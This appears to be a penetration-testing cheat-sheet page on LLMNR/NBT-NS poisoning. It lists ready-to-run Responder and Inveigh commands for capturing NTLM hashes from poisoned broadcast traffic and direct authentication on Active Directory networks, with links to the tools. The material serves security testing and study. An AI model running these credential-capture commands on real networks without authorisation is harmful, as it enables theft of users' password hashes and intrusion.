# LLMNR/NBT-NS Poisoning

{% hint style="warning" %}
* When you run a hash‑capture tool from one machine, you get **poisoned broadcast traffic** (LLMNR/NBT‑NS/WPAD).
* If the machine is **AD‑joined**, you can also capture **direct authentication attempts** made to that specific host (SMB, RDP, mapped drives, scheduled tasks, etc.).
* Because each machine may receive its own legitimate auth traffic, running from **different AD‑joined machines** can yield **different user hashes** — not only from poisoning, but also from those direct connections.
{% endhint %}

### Capturing Hashes

* **Linux**
  * `sudo responder -I <interface> -dP` <sup><sub>(-v verbose) (-w for WPAD server)<sub></sup>
  * `sudo responder -I <interface> -wrfv`
* **Windows**
  * `Import-Module .\Inveigh.ps1`
  * `(Get-Command Invoke-Inveigh).Parameters`&#x20;
  * `Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y`&#x20;
  * Use the compiled C# version for the latest fetures. (`.\Inveigh.exe`)
    * `ESC -> HELP`

### Tools

* [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) or [InveighZero](https://github.com/Kevin-Robertson/Inveigh/releases)
* [Responder](https://github.com/lgandx/Responder)
* [Metasploit](https://www.metasploit.com/)
